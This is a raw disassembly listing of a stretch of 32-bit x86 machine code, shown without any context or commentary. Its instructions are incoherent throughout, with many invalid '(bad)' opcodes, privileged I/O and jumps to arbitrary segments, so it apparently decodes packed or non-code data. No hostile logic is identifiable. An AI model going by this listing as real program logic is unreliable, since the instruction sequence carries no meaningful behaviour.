  41bd72:	xchg   esp,eax
  41bd73:	push   edx
  41bd74:	pop    es
  41bd75:	push   ebx
  41bd77:	dec    edi
  41bd78:	adc    BYTE PTR [eax+0x35],bl
  41bd7b:	ss inc edi
  41bd7d:	in     eax,dx
  41bd7e:	shl    ch,1
  41bd80:	(bad)  
  41bd81:	lds    eax,FWORD PTR [ebp-0x122b6e96]
  41bd87:	dec    ebp
  41bd88:	jecxz  0x41bd26
  41bd8a:	pushf  
  41bd8b:	out    0xba,eax
  41bd8d:	ret    
  41bd8e:	loop   0x41bdf8
  41bd90:	mov    eax,ds:0x994e0467
  41bd95:	out    dx,al
  41bd96:	popf   
  41bd97:	imul   ecx,ecx,0x36a13273
  41bd9d:	daa    
  41bd9e:	sbb    DWORD PTR ds:0xecb96416,0xffffffb5
  41bda5:	xchg   BYTE PTR [edi+0x64],bl
  41bda8:	pop    ecx
  41bda9:	(bad)  
  41bdab:	jge    0x41bd81
  41bdad:	sar    DWORD PTR ds:0xe9f167ae,1
  41bdb3:	inc    di
  41bdb5:	or     al,0xff
  41bdb7:	sbb    eax,0xf752df73
  41bdbc:	shl    ebp,cl
  41bdbe:	mov    ebx,es
  41bdc0:	xchg   ecx,eax
  41bdc1:	shr    al,0xcc
  41bdc4:	mov    dh,0xe3
  41bdc6:	pop    ecx
  41bdc7:	sbb    cl,BYTE PTR [esi-0x222da21e]
  41bdcd:	scas   al,BYTE PTR es:[edi]
  41bdce:	add    BYTE PTR [ebp+0x2d],cl
  41bdd1:	xchg   BYTE PTR [ebp+0x75e214fa],al
  41bdd7:	jl     0x41be58
  41bdd9:	test   DWORD PTR [esi],eax
  41bddb:	add    BYTE PTR [esi+ebp*8+0x1c26060],ah
  41bde2:	fs adc al,0x97
  41bde5:	inc    edi
  41bde6:	add    cl,BYTE PTR [ecx+0x6ab73f8e]
  41bdec:	hlt    
  41bded:	jb     0x41bdee
  41bdef:	aam    0xd1
  41bdf1:	pushf  
  41bdf2:	fwait
  41bdf3:	jne    0x41be00
  41bdf5:	jl     0x41bdda
  41bdf7:	pop    eax
  41bdf8:	adc    al,0x9e
  41bdfa:	or     al,BYTE PTR [edx+0x32]
  41bdfd:	add    bh,dl
  41bdff:	sti    
  41be00:	test   al,0xfb
  41be02:	mov    ecx,0xbb8a04df
  41be07:	pop    esi
  41be08:	aaa    
  41be09:	xchg   edi,eax
  41be0a:	and    BYTE PTR [edx+0x3f1a50d5],bh
  41be10:	std    
  41be11:	mov    ebp,0x77d446a7
  41be16:	addr16 je 0x41be0d
  41be19:	ror    dl,cl
  41be1b:	into   
  41be1c:	push   esp
  41be1d:	aam    0x7c
  41be1f:	mov    es,WORD PTR [ebp+0x49]
  41be22:	or     al,0xca
  41be24:	jmp    0x4a9a0c78
  41be29:	aad    0x20
  41be2b:	jno    0x41bdf9
  41be2d:	or     eax,0xaa5c9fc2
  41be32:	pop    DWORD PTR [ebx+0x125fd95c]
  41be38:	jmp    0x7a34:0x4128c2a3
  41be3f:	push   edi
  41be40:	mov    ecx,DWORD PTR [edi+0x54]
  41be43:	jno    0x41bdcb
  41be45:	neg    bh
  41be47:	imul   edx,edx,0xffffffd3
  41be4a:	dec    ebx
  41be4b:	call   0x61afffc9
  41be50:	sti    
  41be51:	imul   ecx,DWORD PTR [ebx-0x526c1e1d],0x51
  41be58:	cld    
  41be59:	enter  0xe84d,0x3f
  41be5d:	adc    bh,BYTE PTR cs:[esi+0x54]
  41be61:	xchg   BYTE PTR gs:[edi],dh
  41be64:	cmp    DWORD PTR [edi],ebx
  41be66:	xchg   ecx,eax
  41be67:	loop   0x41be76
  41be69:	(bad)  
  41be6a:	xchg   ebp,eax
  41be6b:	ss add bh,bl
  41be6e:	xchg   esi,eax
  41be6f:	jbe    0x41be97
  41be71:	mov    ss,WORD PTR [ecx]
  41be73:	sahf   
  41be74:	mov    esp,0xa9cd6f71
  41be79:	call   DWORD PTR [ebp+0x51]
  41be7c:	cld    
  41be7d:	stc    
  41be7e:	push   cs
  41be7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be80:	in     al,0x27
  41be82:	cmc    
  41be83:	mov    al,0x92
  41be85:	or     eax,0xda32d721
  41be8a:	out    dx,al
  41be8b:	loope  0x41be6f
  41be8d:	popf   
  41be8e:	imul   esp,DWORD PTR [eax],0x2c
  41be91:	scas   eax,DWORD PTR es:[edi]
  41be92:	idiv   DWORD PTR [edx+esi*8]
  41be95:	aaa    
  41be96:	popa   
  41be97:	(bad)  
  41be98:	mov    esp,0xbb26b3f2
  41be9d:	int    0x3c
  41be9f:	test   esi,ebx
  41bea1:	jecxz  0x41bf12
  41bea3:	arpl   WORD PTR [eax-0x44524d13],si
  41bea9:	push   0x7465ebd0
  41beae:	ja     0x41be91
  41beb0:	xchg   esp,eax
  41beb1:	mov    eax,ds:0xcdaea40c
  41beb6:	lods   al,BYTE PTR ds:[esi]
  41beb7:	xor    al,0xd2
  41beb9:	jne    0x41bec4
  41bebb:	add    bh,BYTE PTR [ebx]
  41bebd:	hlt    
  41bebe:	inc    ebp
  41bebf:	cli    
  41bec0:	add    al,0xee
  41bec2:	sbb    esp,ecx
  41bec4:	stos   DWORD PTR es:[edi],eax
  41bec5:	or     ebp,DWORD PTR [edi+0x2f]
  41bec8:	jnp    0x41beb5
  41beca:	sbb    BYTE PTR [eax],0x9
  41becd:	test   BYTE PTR [esi+0x5d],dh
  41bed0:	jb     0x41becc
  41bed2:	sbb    eax,0xb6244670
  41bed7:	(bad)  
  41bed8:	mov    bh,0xd3
  41beda:	scas   al,BYTE PTR es:[edi]
  41bedb:	scas   eax,DWORD PTR es:[edi]
  41bedc:	pop    ebp
  41bedd:	out    0x9,eax
  41bedf:	icebp  
  41bee0:	shr    DWORD PTR [edx+0x3c],0x3a
  41bee4:	(bad)  
  41bee5:	in     al,0x22
  41bee7:	xchg   esp,eax
  41bee8:	jne    0x41bf36
  41beea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beeb:	stos   DWORD PTR es:[edi],eax
  41beec:	mov    WORD PTR [ecx+ebp*2],ds
  41beef:	mov    BYTE PTR [ecx-0x4e86348e],cl
  41bef5:	imul   edx,DWORD PTR [edi],0x51353e53
  41befb:	out    dx,eax
  41befc:	pop    esp
  41befd:	mov    eax,0x6ae313fe
  41bf02:	test   DWORD PTR [eax+0x604ee18a],esp
  41bf08:	or     al,0x10
  41bf0a:	cmp    edx,DWORD PTR [ebx-0x67a5d17e]
  41bf10:	add    ecx,DWORD PTR [esi-0x2f135a47]
  41bf16:	fnsave [eax]
  41bf18:	inc    ebx
  41bf19:	outs   dx,BYTE PTR ds:[esi]
  41bf1a:	aam    0xbe
  41bf1c:	outs   dx,BYTE PTR ds:[esi]
  41bf1d:	inc    ecx
  41bf1e:	retf   0xfc6b
  41bf21:	(bad)  
  41bf22:	into   
  41bf23:	xor    edx,DWORD PTR [eax-0x42]
  41bf26:	jnp    0x41beaf
  41bf28:	push   0x3c888d63
  41bf2d:	mov    ebp,0x42b12a74
  41bf32:	pop    ds
  41bf33:	mov    esi,0xb1aeab2e
  41bf38:	pop    edx
  41bf39:	xor    BYTE PTR [edi-0xa],dl
  41bf3c:	pushf  
  41bf3d:	dec    ebx
  41bf3e:	cld    
  41bf3f:	jg     0x41bed8
  41bf41:	test   bl,0x84
  41bf44:	pop    ebx
  41bf45:	hlt    
  41bf46:	xlat   BYTE PTR ds:[ebx]
  41bf47:	jecxz  0x41bfaa
  41bf49:	call   0x47c4:0x40044c08
  41bf50:	inc    esp
  41bf51:	or     eax,0x258d9f21
  41bf56:	pop    edi
  41bf57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf58:	mov    dh,ch
  41bf5a:	xchg   edi,eax
  41bf5b:	push   eax
  41bf5c:	repnz mov WORD PTR [ebx+0x1f],es
  41bf60:	addr16 jmp 0xef444524
  41bf66:	xchg   bl,dh
  41bf68:	shr    DWORD PTR [edi-0xb67f96e],0xe9
  41bf6f:	sub    dl,BYTE PTR [ebp+0x7f63086]
  41bf75:	xchg   esi,eax
  41bf76:	xor    al,0xde
  41bf78:	(bad)  
  41bf79:	dec    esi
  41bf7a:	cmp    eax,0x3f09a39c
  41bf7f:	sbb    DWORD PTR [esi],0xe67336bf
  41bf85:	cld    
  41bf86:	retf   0x4fdb
  41bf89:	xchg   ch,dl
  41bf8b:	push   esp
  41bf8c:	xchg   DWORD PTR [edi-0x2b],ebx
  41bf8f:	popf   
  41bf90:	xor    al,0x68
  41bf92:	xchg   edi,eax
  41bf93:	daa    
  41bf94:	mov    al,0x6e
  41bf96:	sub    ah,BYTE PTR [ecx-0x73b0aaf4]
  41bf9c:	cmp    al,0x36
  41bf9e:	add    eax,0x7644c431
  41bfa3:	test   ebx,ebp
  41bfa5:	ror    BYTE PTR [ebx-0x7e55dadd],1
  41bfab:	dec    edx
  41bfac:	into   
  41bfad:	dec    esi
  41bfae:	pushf  
  41bfaf:	div    esp
  41bfb1:	rcr    DWORD PTR [ebp+0x1ae9b72c],1
  41bfb7:	xchg   edx,eax
  41bfb8:	enter  0x5974,0x45
  41bfbc:	jl     0x41bfe9
  41bfbe:	xor    esp,edi
  41bfc0:	xchg   ebp,eax
  41bfc1:	xor    edx,DWORD PTR [ebp-0x14296f6a]
  41bfc7:	(bad)  
  41bfc8:	ret    
  41bfc9:	sbb    DWORD PTR [ecx-0x7d],ebx
  41bfcc:	mov    edx,0x6e24ed36
  41bfd1:	call   0x75d9:0x1ddbd878
  41bfd8:	adc    eax,0x40f2e2ab
  41bfdd:	pop    esp
  41bfde:	add    eax,0x14abcce1
  41bfe3:	sbb    ah,BYTE PTR [eax+0x34]
  41bfe6:	not    BYTE PTR [eax]
  41bfe8:	jne    0x41c032
  41bfea:	pop    edi
  41bfeb:	xor    DWORD PTR [esi],ebx
  41bfed:	aam    0x19
  41bfef:	add    edx,DWORD PTR [ecx+0xb1cb1f6]
  41bff5:	test   eax,0x73e83061
  41bffa:	push   ebp
  41bffb:	add    BYTE PTR ds:0xdd8f3308,al
  41c001:	lahf   
  41c002:	dec    esp
  41c003:	xor    BYTE PTR [esi],dl
  41c005:	and    DWORD PTR [esi+0x2b],esp
  41c008:	fist   WORD PTR [ebx+0x4a9c9fb0]
  41c00e:	mov    cl,0xa7
  41c010:	lahf   
  41c011:	fstp   DWORD PTR [ebx-0x11bc4b3e]
  41c017:	(bad)  
  41c018:	mov    ecx,0x6675a7c3
  41c01d:	lods   eax,DWORD PTR ds:[esi]
  41c01e:	(bad)  
  41c01f:	(bad)  
  41c020:	cmp    ch,BYTE PTR [eax-0x40]
  41c023:	dec    esp
  41c024:	cmp    ebp,DWORD PTR [esi]
  41c026:	adc    bh,0x7b
  41c029:	gs add eax,0x6824f962
  41c02f:	loope  0x41bfcc
  41c031:	gs dec edx
  41c033:	xor    ch,0x21
  41c036:	out    dx,eax
  41c037:	pop    esp
  41c038:	push   edx
  41c039:	mov    ebx,DWORD PTR ss:[edi+edi*2-0x33]
  41c03e:	ficomp WORD PTR [edx+0x61fd864e]
  41c044:	cmp    bh,BYTE PTR ds:0x1ef226c6
  41c04a:	jbe    0x41c09a
  41c04c:	or     DWORD PTR [edx],edx
  41c04e:	clc    
  41c04f:	aad    0xc3
  41c051:	aaa    
  41c052:	xor    esp,ebx
  41c054:	xor    ebp,ecx
  41c056:	daa    
  41c057:	das    
  41c058:	and    BYTE PTR [ecx+0x3f],bl
  41c05b:	fld    QWORD PTR [edi-0x2c]
  41c05e:	inc    edi
  41c05f:	fbld   TBYTE PTR [ebx]
  41c061:	add    eax,0x4d515209
  41c066:	mov    esi,0xd1bb6766
  41c06b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c06c:	into   
  41c06d:	sbb    edx,DWORD PTR [eax]
  41c06f:	jge    0x41c06a
  41c071:	test   BYTE PTR fs:[esi-0x34843f65],0x1a
  41c079:	adc    bh,al
  41c07b:	jle    0x41c0eb
  41c07d:	loope  0x41c053
  41c07f:	jmp    0xa947dec6
  41c084:	adc    al,0x63
  41c086:	inc    edi
  41c087:	add    DWORD PTR [ebp-0x24],eax
  41c08a:	std    
  41c08b:	mov    ch,BYTE PTR ds:0x40bd71b0
  41c091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c092:	aad    0xa1
  41c094:	xchg   ecx,eax
  41c095:	adc    bh,BYTE PTR [ebp+0x33dcc876]
  41c09b:	mov    edi,0x7b846a7f
  41c0a0:	int3   
  41c0a1:	stc    
  41c0a2:	push   0x1cd798d0
  41c0a7:	sbb    BYTE PTR [edi],ah
  41c0a9:	outs   dx,BYTE PTR ds:[esi]
  41c0aa:	hlt    
  41c0ab:	jmp    0xfaa1ce64
  41c0b0:	inc    ecx
  41c0b1:	cdq    
  41c0b2:	mov    bh,0x8f
  41c0b4:	iret   
  41c0b5:	dec    ecx
  41c0b6:	sub    al,0x93
  41c0b8:	icebp  
  41c0b9:	(bad)  
  41c0ba:	mov    edx,0x3890efb2
  41c0bf:	or     eax,0xc892fe9d
  41c0c4:	adc    eax,0xf9a924b9
  41c0c9:	mov    edi,0xc2ba6a45
  41c0ce:	mov    ecx,ds
  41c0d0:	ficomp WORD PTR [esi+eiz*4]
  41c0d3:	fcom   QWORD PTR ds:0x8644ab1f
  41c0d9:	sar    ebx,0x85
  41c0dc:	lahf   
  41c0dd:	aad    0x78
  41c0df:	into   
  41c0e0:	dec    edx
  41c0e1:	jle    0x41c147
  41c0e3:	stos   BYTE PTR es:[edi],al
  41c0e4:	adc    dh,ch
  41c0e6:	xor    ch,BYTE PTR [eax+0x39]
  41c0e9:	pop    ds
  41c0ea:	mov    esp,0x47d7a9eb
  41c0ef:	inc    edi
  41c0f0:	add    eax,0xf62777d6
  41c0f5:	imul   eax,DWORD PTR [edi+0x28],0xffffffa2
  41c0f9:	or     eax,0x904e6a4e
  41c0fe:	push   eax
  41c0ff:	push   ds
  41c100:	ret    
  41c101:	mov    esp,0xd3cced2c
  41c106:	jle    0x41c0bc
  41c108:	inc    esp
  41c109:	push   esi
  41c10a:	js     0x41c0c7
  41c10c:	pop    edi
  41c10d:	and    al,0x73
  41c10f:	mov    al,0xf
  41c111:	add    al,dl
  41c113:	cdq    
  41c114:	cs xor al,0x6e
  41c117:	in     eax,0xe5
  41c119:	les    esp,FWORD PTR [eax+0x4fb7d9e8]
  41c11f:	aaa    
  41c120:	mov    edi,0xd92df0ea
  41c125:	fidivr DWORD PTR ds:0x7bd7bcf3
  41c12b:	gs in  eax,dx
  41c12d:	mov    ebp,0x5a1129ea
  41c132:	push   cs
  41c133:	inc    edi
  41c134:	pop    edi
  41c135:	jnp    0x41c0cc
  41c137:	outs   dx,BYTE PTR ds:[esi]
  41c138:	xor    bl,dh
  41c13a:	pusha  
  41c13b:	jp     0x41c10a
  41c13d:	mov    ds:0x52acdfee,al
  41c142:	cs aam 0xc8
  41c145:	mov    ah,0xe8
  41c147:	and    cl,al
  41c149:	and    BYTE PTR [edx+0x33],0x3f
  41c14d:	mov    eax,ds:0x7717622c
  41c152:	ins    DWORD PTR es:[edi],dx
  41c153:	pop    ecx
  41c154:	ja     0x41c1a6
  41c156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c157:	and    bl,cl
  41c159:	lock add cl,dl
  41c15c:	(bad)  [edi-0x3cfe6cf2]
  41c162:	aas    
  41c163:	gs cmc 
  41c165:	add    eax,0xeafe71a0
  41c16a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c16b:	stos   DWORD PTR es:[edi],eax
  41c16c:	cmp    al,0xff
  41c16e:	retf   0xa265
  41c171:	loopne 0x41c0ff
  41c173:	mov    esi,0xe31328d7
  41c178:	dec    ebp
  41c179:	xor    al,0x22
  41c17b:	mov    bl,0xfe
  41c17d:	popa   
  41c17e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c17f:	jb     0x41c1f2
  41c181:	nop
  41c182:	and    cl,al
  41c184:	cld    
  41c185:	pop    ebp
  41c186:	xor    bh,BYTE PTR [edi+0x744cf84d]
  41c18c:	inc    ebx
  41c18d:	jl     0x41c17d
  41c18f:	mov    ecx,0x3f7f96ac
  41c194:	pop    ecx
  41c195:	sti    
  41c196:	call   0x3ab2f209
  41c19b:	cmp    esp,esp
  41c19d:	mov    eax,ds:0xe93be9da
  41c1a2:	nop
  41c1a3:	jle    0x41c1ef
  41c1a5:	aad    0x8c
  41c1a7:	push   ebp
  41c1a8:	sub    al,0x17
  41c1aa:	sbb    BYTE PTR [ebp+edi*4-0x75],0xd9
  41c1af:	dec    esi
  41c1b0:	push   edx
  41c1b1:	repz xor al,0xfd
  41c1b4:	mov    WORD PTR [edi],?
  41c1b6:	sub    ebx,esp
  41c1b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1b9:	retf   0x8478
  41c1bc:	fst    DWORD PTR [esi]
  41c1be:	push   es
  41c1bf:	fcom   st(0)
  41c1c1:	mov    al,0x9c
  41c1c3:	sbb    cl,BYTE PTR [edx]
  41c1c5:	xchg   DWORD PTR [ebx-0x176b2977],edi
  41c1cb:	mov    ds:0xf31da41d,eax
  41c1d0:	aam    0xd3
  41c1d2:	(bad)  
  41c1d3:	jle    0x41c225
  41c1d5:	push   esi
  41c1d6:	cmp    BYTE PTR [esi],cl
  41c1d8:	addr16 loope 0x41c17e
  41c1db:	dec    edx
  41c1dc:	loopne 0x41c1fc
  41c1de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1df:	shl    DWORD PTR [esi+edx*2-0x3e],0x3d
  41c1e4:	and    al,0x35
  41c1e6:	mov    al,ds:0x990ab804
  41c1eb:	outs   dx,DWORD PTR ds:[esi]
  41c1ec:	leave  
  41c1ed:	mov    edx,0xfe9f2f56
  41c1f2:	pop    edx
  41c1f3:	and    DWORD PTR [edx],ebp
  41c1f5:	sar    DWORD PTR [ebx+0x206db95a],0x41
  41c1fc:	mov    eax,ds:0x71b996c0
  41c201:	stos   BYTE PTR es:[edi],al
  41c202:	ds sbb dl,0x1e
  41c206:	mov    edi,0xd1699cb5
  41c20b:	sub    eax,0xb36cb3e3
  41c210:	mov    al,ds:0xbc958d03
  41c215:	and    DWORD PTR [ecx+ebp*8],ebx
  41c218:	push   ds
  41c219:	lahf   
  41c21a:	inc    ebp
  41c21b:	jecxz  0x41c265
  41c21d:	mov    ds:0x50d6b3d1,eax
  41c222:	ficomp DWORD PTR [edx-0x1ed05872]
  41c228:	cmc    
  41c229:	setns  BYTE PTR [esi]
  41c22c:	cmp    DWORD PTR [eax],ebp
  41c22e:	and    al,0x1f
  41c230:	sbb    al,0x71
  41c232:	in     al,0x4b
  41c234:	push   edx
  41c235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c236:	jno    0x41c252
  41c238:	cmp    esp,DWORD PTR [ebx+0x37]
  41c23b:	cmp    DWORD PTR [edx],ebp
  41c23d:	jnp    0x41c26e
  41c23f:	gs neg edi
  41c242:	mov    ecx,0x5d36475
  41c247:	lock pop edi
  41c249:	pusha  
  41c24a:	neg    BYTE PTR [ebp+edx*8-0x74]
  41c24e:	push   0xffffffcf
  41c250:	push   0xadfaedc0
  41c255:	dec    ebp
  41c256:	cmp    DWORD PTR [ebx-0x3d],esp
  41c259:	setge  bh
  41c25c:	xchg   BYTE PTR [edi+0x73],ah
  41c25f:	or     DWORD PTR [ecx],eax
  41c261:	rcr    DWORD PTR [eax+0x67],0xcd
  41c265:	loop   0x41c21b
  41c267:	mov    esi,ecx
  41c269:	pop    ecx
  41c26a:	xchg   ebp,eax
  41c26b:	jge    0x41c247
  41c26d:	sbb    edi,edi
  41c26f:	xor    DWORD PTR [edx+0x6887dc98],edi
  41c275:	xchg   edi,esi
  41c277:	inc    edx
  41c278:	jmp    0xb84d:0xce65f0f5
  41c27f:	or     al,0xe7
  41c281:	bound  edx,QWORD PTR [ebx+ebx*8+0x3]
  41c285:	loop   0x41c305
  41c287:	push   eax
  41c288:	inc    edi
  41c289:	je     0x41c2e3
  41c28b:	outs   dx,BYTE PTR ds:[esi]
  41c28c:	scas   al,BYTE PTR es:[edi]
  41c28d:	xchg   esp,eax
  41c28e:	imul   esi,DWORD PTR cs:[edi+esi*4-0x2c7b05],0xffffffba
  41c297:	push   esi
  41c298:	push   ebx
  41c299:	xor    BYTE PTR [edx],0xc
  41c29c:	shl    DWORD PTR [ecx+0x5a],cl
  41c29f:	xor    bh,BYTE PTR [ebx-0x30]
  41c2a2:	nop
  41c2a3:	jnp    0x41c30f
  41c2a5:	or     DWORD PTR [ebp-0x46],edi
  41c2a8:	jo     0x41c2d6
  41c2aa:	lds    esi,FWORD PTR [eax+0x5d]
  41c2ad:	mov    eax,0xfd21f195
  41c2b2:	call   0xb3becdec
  41c2b7:	fs jmp 0xe91d6fce
  41c2bd:	sahf   
  41c2be:	imul   eax,DWORD PTR ds:0x5338c843,0xffffff92
  41c2c5:	ror    BYTE PTR [ebp-0x50726940],1
  41c2cb:	data16 sbb al,0x74
  41c2ce:	or     DWORD PTR [edx-0x1bcd36b0],edx
  41c2d4:	dec    esp
  41c2d5:	inc    edx
  41c2d6:	shr    bl,cl
  41c2d8:	iret   
  41c2d9:	pop    esp
  41c2da:	(bad)  
  41c2db:	jg     0x41c2ad
  41c2dd:	jne    0x41c353
  41c2df:	xor    al,0x53
  41c2e1:	(bad)  
  41c2e2:	es pop ebx
  41c2e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2e5:	pop    esi
  41c2e6:	sub    cl,BYTE PTR [ebp+0x45]
  41c2e9:	ins    BYTE PTR es:[edi],dx
  41c2ea:	xor    eax,0x684260f3
  41c2ef:	xchg   edx,eax
  41c2f0:	xor    al,0xcf
  41c2f2:	cmp    eax,0x71d22ca7
  41c2f7:	aaa    
  41c2f8:	jns    0x41c2c7
  41c2fa:	sar    DWORD PTR [eax],cl
  41c2fc:	inc    ecx
  41c2fd:	adc    al,ah
  41c2ff:	inc    ecx
  41c300:	jg     0x41c2ea
  41c302:	test   al,0x4c
  41c304:	mov    ebp,0x9d7079e5
  41c309:	dec    esi
  41c30a:	jb     0x41c2c2
  41c30c:	mov    ebp,DWORD PTR [edx-0x128aa8c2]
  41c312:	das    
  41c313:	mov    eax,0xba593505
  41c318:	inc    esi
  41c319:	mov    BYTE PTR [ecx+0x579f534a],cl
  41c31f:	and    esi,esp
  41c321:	push   esi
  41c322:	lahf   
  41c323:	lods   al,BYTE PTR ds:[esi]
  41c324:	adc    ebx,DWORD PTR [eax]
  41c326:	cld    
  41c327:	das    
  41c328:	xor    ebx,DWORD PTR [eax]
  41c32a:	and    al,0x9
  41c32c:	(bad)
  41c32f:	dec    edx
  41c330:	addr16 push ds
  41c332:	adc    al,0x14
  41c334:	retf   0x7f58
  41c337:	mov    edi,0x7cffec62
  41c33c:	sar    BYTE PTR [edx-0x673f1539],1
  41c342:	retf   0x149e
  41c345:	push   ebx
  41c346:	fbld   TBYTE PTR [edx-0x6ba87e5a]
  41c34c:	dec    ebp
  41c34d:	neg    DWORD PTR [eax+0x44eba219]
  41c353:	or     esp,DWORD PTR [ecx-0x7dd5603d]
  41c359:	mov    ebx,0xf61cea8e
  41c35e:	call   0x193f:0x3009ed78
  41c365:	cmp    BYTE PTR [eax+0x5b5f5390],cl
  41c36b:	inc    ebp
  41c36c:	mov    ?,WORD PTR [eax-0x45]
  41c36f:	dec    eax
  41c370:	cmp    bl,ch
  41c372:	gs clc 
  41c374:	xchg   DWORD PTR [esi-0x78],esi
  41c377:	and    eax,0x12973c7f
  41c37c:	sbb    eax,0x63ae053e
  41c381:	loop   0x41c3a0
  41c383:	sbb    BYTE PTR [edx+0x7e],bh
  41c386:	dec    ebp
  41c387:	cmp    bh,BYTE PTR ds:0x28bfaa90
  41c38d:	inc    esp
  41c38e:	jnp    0x41c3a0
  41c390:	dec    edi
  41c391:	(bad)  
  41c392:	in     al,dx
  41c393:	mov    ebp,0x8aa59f84
  41c398:	fstp   DWORD PTR [esi+0x11]
  41c39b:	xor    esp,DWORD PTR [edx-0x34095be2]
  41c3a1:	or     BYTE PTR ds:[edi+0x5],cl
  41c3a5:	sub    ah,BYTE PTR [esi+0x5b899b7a]
  41c3ab:	jp     0x41c33e
  41c3ad:	mov    ebx,DWORD PTR [ecx-0x1e8d5b27]
  41c3b3:	sbb    cl,BYTE PTR ds:0xfdab9a96
  41c3b9:	push   cs
  41c3ba:	jp     0x41c40d
  41c3bc:	mov    eax,ds:0xeeb93e76
  41c3c1:	jbe    0x41c3c5
  41c3c3:	xchg   esi,eax
  41c3c4:	xchg   edi,eax
  41c3c5:	and    BYTE PTR [ecx+edi*2-0x1b770a5e],bh
  41c3cc:	ins    DWORD PTR es:[edi],dx
  41c3cd:	jle    0x41c36c
  41c3cf:	fs ror al,cl
  41c3d2:	inc    edx
  41c3d3:	cdq    
  41c3d4:	jle    0x41c44c
  41c3d6:	push   ecx
  41c3d7:	xor    BYTE PTR [eax-0x167679cc],0x5b
  41c3de:	and    dl,cl
  41c3e0:	(bad)  
  41c3e1:	std    
  41c3e2:	sbb    bl,bl
  41c3e4:	cmp    DWORD PTR [ebx-0x64d5a5da],ebp
  41c3ea:	sub    edi,DWORD PTR [edx+0x54a8d157]
  41c3f0:	into   
  41c3f1:	sub    ah,BYTE PTR [esi]
  41c3f3:	push   ds
  41c3f4:	nop
  41c3f5:	stc    
  41c3f6:	cld    
  41c3f7:	adc    al,0x4d
  41c3f9:	lsl    ebp,si
  41c3fc:	es xchg esi,eax
  41c3fe:	test   DWORD PTR [edi],esi
  41c400:	lods   al,BYTE PTR ds:[esi]
  41c401:	(bad)  
  41c402:	sti    
  41c403:	lods   eax,DWORD PTR ds:[esi]
  41c404:	bnd jmp 0x41c44b
  41c407:	sbb    ecx,DWORD PTR [ecx+0x38e3f0a1]
  41c40d:	clc    
  41c40e:	fwait
  41c40f:	push   ecx
  41c410:	pop    ecx
  41c411:	aam    0x81
  41c413:	add    edi,DWORD PTR [ebx]
  41c415:	outs   dx,BYTE PTR ds:[esi]
  41c416:	out    dx,al
  41c417:	xlat   BYTE PTR ds:[ebx]
  41c418:	xor    ebx,edi
  41c41a:	adc    ch,BYTE PTR [edi]
  41c41c:	xchg   edi,ebx
  41c41e:	xchg   BYTE PTR [ebx],ch
  41c420:	adc    esp,edx
  41c422:	dec    ebp
  41c423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c424:	add    dh,BYTE PTR [eax+0x2]
  41c427:	(bad)  
  41c428:	mov    bl,0xe3
  41c42a:	in     eax,0xda
  41c42c:	cdq    
  41c42d:	jle    0x41c421
  41c42f:	mov    WORD PTR [ebx+0xa],gs
  41c432:	cdq    
  41c433:	xor    DWORD PTR [edi-0x4e097812],edx
  41c439:	cmp    DWORD PTR [edi+0x37481d5f],0x871e630
  41c443:	(bad)  
  41c444:	push   edx
  41c445:	lea    eax,[esi]
  41c447:	jmp    FWORD PTR [esi]
  41c449:	ja     0x41c46a
  41c44b:	in     eax,dx
  41c44c:	mov    cl,0x51
  41c44e:	xchg   esp,eax
  41c44f:	mov    ah,0x9d
  41c451:	pop    es
  41c452:	(bad)  
  41c453:	mov    edi,0x60e5e5d4
  41c458:	jb     0x41c490
  41c45a:	sbb    ebx,DWORD PTR [ecx]
  41c45c:	and    al,0xed
  41c45e:	xchg   ebx,eax
  41c45f:	aaa    
  41c460:	out    0xa0,eax
  41c462:	fldlg2 
  41c464:	cmp    eax,0xc59b2df6
  41c469:	dec    ebx
  41c46a:	jl     0x41c4bb
  41c46c:	cwde   
  41c46d:	add    DWORD PTR [edi-0x46],esp
  41c470:	pop    ebp
  41c471:	xchg   DWORD PTR ds:0xfe0ce222,edi
  41c477:	or     bl,BYTE PTR [edx+0x66475836]
  41c47d:	xor    DWORD PTR [ebx-0x2d41f54c],edi
  41c483:	in     al,0xc8
  41c485:	push   ebp
  41c486:	inc    edi
  41c487:	cmp    eax,DWORD PTR [esi-0x69d0c4a8]
  41c48d:	and    eax,0x15843fb
  41c492:	lock push esp
  41c494:	xor    DWORD PTR [ecx],eax
  41c496:	leave  
  41c497:	mov    eax,0x19f86c1b
  41c49c:	dec    ebx
  41c49d:	sbb    BYTE PTR [ecx+edx*2],0x4d
  41c4a1:	xlat   BYTE PTR ds:[ebx]
  41c4a2:	push   cs
  41c4a3:	xor    eax,0xfe1b5db1
  41c4a8:	mov    esi,0x5cd6209b
  41c4ad:	adc    bh,al
  41c4af:	push   ebx
  41c4b0:	ret    0xad74
  41c4b3:	push   0x2d
  41c4b5:	or     BYTE PTR [eax-0x23],0xe4
  41c4b9:	sbb    DWORD PTR ds:0x211ec57,esp
  41c4bf:	mov    edx,0x16c177c9
  41c4c4:	(bad)  
  41c4c6:	jne    0x41c484
  41c4c8:	test   DWORD PTR [edi+0x52],esp
  41c4cb:	hlt    
  41c4cc:	and    cl,0xf9
  41c4cf:	jle    0x41c53e
  41c4d1:	test   eax,0x77c22984
  41c4d6:	js     0x41c4e5
  41c4d8:	mov    bl,0x17
  41c4da:	leave  
  41c4db:	sti    
  41c4dc:	sar    DWORD PTR ds:0x7eb207da,cl
  41c4e2:	(bad)  
  41c4e3:	stc    
  41c4e4:	xchg   edx,eax
  41c4e5:	es xor eax,0x75ed725c
  41c4eb:	retf   
  41c4ec:	push   ss
  41c4ed:	aaa    
  41c4ee:	icebp  
  41c4ef:	mov    esi,0xda6c1416
  41c4f4:	jae    0x41c521
  41c4f6:	ror    al,1
  41c4f8:	or     ah,bl
  41c4fa:	popa   
  41c4fb:	jae    0x41c53c
  41c4fd:	cs dec ecx
  41c4ff:	loopne 0x41c523
